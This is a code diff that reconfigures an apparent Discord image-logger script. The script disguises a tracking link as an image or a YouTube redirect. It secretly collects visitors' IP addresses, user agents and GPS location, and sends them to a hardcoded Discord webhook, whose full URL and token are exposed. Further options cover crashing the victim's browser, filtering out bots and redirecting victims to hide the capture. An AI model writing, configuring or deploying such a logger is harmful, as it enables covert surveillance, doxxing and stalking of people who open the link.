@@ -10,29 +10,26 @@ __description__ = "martivi aplikacia discordit ip dasadgena"
 __version__ = "v2.0"
 __author__ = "ALUBALIBALI"
 
-youtube_link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-webbrowser.open(youtube_link)
-
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
-    "image": "https://m.media-amazon.com/images/I/81f5juHXlrL._AC_UF1000,1000_QL80_.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m", # You can also have a custom image by using a URL argument
+    "link": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDRAZSdO2DA3E&index=1",
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-   "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+   "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "SAMXARA", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "by_samxara run pusssssssssssssssssssssssy", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 2, # Prevents VPNs from triggering the alert
@@ -43,7 +40,7 @@ config = {
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 4, # Prevents bots from triggering the alert
+    "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
@@ -53,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDR8bcRRN0Gj0&index=2" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDRAZSdO2DA3E&index=1" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -90,7 +87,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = True):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
